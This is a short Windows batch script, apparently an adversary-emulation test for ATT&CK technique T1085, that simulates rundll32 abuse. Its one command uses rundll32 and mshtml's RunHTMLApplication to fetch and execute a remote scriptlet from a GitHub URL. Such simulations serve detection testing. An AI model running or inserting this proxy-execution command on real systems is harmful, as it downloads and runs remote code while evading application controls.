@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO Technique: Rundll32 (T1085)
ECHO.
ECHO [+] Simulates use of 'RUNDLL32' to perform suspicious activities
ECHO -------------------------------------------------------------------
cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/poc/master/calc.sct").Exec();
ECHO.
